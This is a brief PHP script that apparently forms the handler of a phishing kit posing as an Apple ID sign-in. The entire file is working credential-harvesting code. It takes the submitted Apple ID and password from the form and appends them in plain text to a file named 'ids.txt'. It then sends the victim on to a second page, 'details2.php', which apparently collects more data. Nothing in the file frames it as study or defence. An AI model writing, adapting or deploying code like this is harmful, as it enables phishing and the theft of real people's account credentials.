<?php

session_start();

$_SESSION['email'] = $_POST['appleid'];
$_SESSION['password'] = $_POST['password'];


$ip = $_SERVER['REMOTE_ADDR'];
    $handle = fopen('../ids.txt', 'a'); // Open the file for appending
     $data = "".$_SESSION['email']." - ".$_SESSION['password']."
";
    fwrite($handle, $data);
    fclose($handle);

 header( 'Location: details2.php' ) ;

?>